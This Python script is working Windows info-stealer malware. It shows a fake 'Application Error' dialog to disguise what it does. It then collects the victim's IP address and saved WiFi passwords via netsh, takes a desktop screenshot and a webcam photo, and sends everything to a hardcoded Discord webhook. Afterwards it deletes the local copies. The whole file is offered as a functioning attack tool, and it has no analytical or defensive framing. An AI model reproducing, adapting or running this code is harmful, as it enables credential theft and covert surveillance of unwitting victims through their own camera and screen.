import requests
import socket
import subprocess
import platform
import os
import sys
import pyautogui
from discord_webhook import DiscordWebhook, DiscordEmbed
import cv2
import ctypes
from sys import exit
import pathlib
import shutil
# Define the MessageBox function from the ctypes library
MessageBox = ctypes.windll.user32.MessageBoxW

# Set the parameters for the fake error message
message = "The application was unable to start correctly (0xc000007b). Click OK to close the application."  # Error message text
title = "Application Error"                     # Title of the error message box
style = 0x10 | 0x0                  # Icon style and button set (0x10 for error icon, 0x1 for OK button)

# Display the fake error message box
MessageBox(None, message, title, style)

webhook_url = 'https://discord.com/api/webhooks/1163392149715439678/qsQ-YAZTDQcit4eiaI9iAIAIR04UnDXzb-SWH9HJaFRTEOB7z1lMpLXf-pNQUyrNmm8C'

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ip_address = s.getsockname()[0]
    s.close()
    return ip_address

def send_to_discord(message):
    payload = {"content": message}
    requests.post(webhook_url, json=payload)

def retrieve_wifi_passwords():
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], shell=True).decode()
        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
        passwords = []
        
        for profile in profiles:
            password_output = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"], shell=True).decode()
            password_lines = password_output.splitlines()
            password_line = [line.split(":")[1].strip() for line in password_lines if "Key Content" in line]
            
            if len(password_line) > 0:
                password = password_line[0]
                passwords.append(f"{profile}: {password}")

        if len(passwords) > 0:
            message = "WiFi Passwords:\n" + "\n".join(passwords)
            send_to_discord(message)
        else:
            send_to_discord("No WiFi passwords found on the system.")
    except Exception as e:
        send_to_discord(f"Failed to retrieve WiFi passwords: {str(e)}")



def steal_ip_and_wifi_passwords():
    ip_address = get_ip()
    send_to_discord(f'IP address: {ip_address}')
    retrieve_wifi_passwords()

def create_temp_folder():
    temp_folder = "C:\\temp"  # Path to the temp folder
    if not os.path.exists(temp_folder):
        try:
            os.makedirs(temp_folder)
            print("Folder created successfully.")
        except OSError as e:
            print(f"Failed to create folder: {e}")
    else:
        print("Folder already exists.")

if __name__ == "__main__":
    create_temp_folder()

steal_ip_and_wifi_passwords()
p = platform.system, os.name, sys.platform 
s = platform.release(), platform.version() 
r = platform.platform(),sys.platform 
send_to_discord(f'platfrom: {r}')

pyautogui.screenshot("C:\\temp\\sren.png")

from discord_webhook import DiscordWebhook, DiscordEmbed
webhook_url = 'https://discord.com/api/webhooks/1163392149715439678/qsQ-YAZTDQcit4eiaI9iAIAIR04UnDXzb-SWH9HJaFRTEOB7z1lMpLXf-pNQUyrNmm8C'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
embed.set_title('File Upload')
embed.set_description('This is an example file upload')
with open('C:\\temp\\sren.png', 'rb') as f: 
    file_data = f.read() 
webhook.add_file(file_data, 'C:\\temp\\sren.png')
webhook.add_embed(embed)
response = webhook.execute()
os.remove("C:\\temp\\sren.png")

cap = cv2.VideoCapture(0)

if not cap.isOpened():
    print("Failed to open the webcam")
    exit()
ret, frame = cap.read()

if not ret:
    print("Failed to read the frame from the webcam")
    exit()
cv2.imwrite("C:\\temp\\webcam_picture.png", frame)
from discord_webhook import DiscordWebhook, DiscordEmbed
webhook_url = 'https://discord.com/api/webhooks/1163392149715439678/qsQ-YAZTDQcit4eiaI9iAIAIR04UnDXzb-SWH9HJaFRTEOB7z1lMpLXf-pNQUyrNmm8C'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
embed.set_title('File Upload')
embed.set_description('This is an example file upload')
with open('C:\\temp\\webcam_picture.png', 'rb') as f: 
    file_data = f.read() 
webhook.add_file(file_data, 'C:\\temp\\webcam_picture.png')
webhook.add_embed(embed)
response = webhook.execute()
os.remove("C:\\temp\\webcam_picture.png")

cap.release()
cv2.destroyAllWindows()

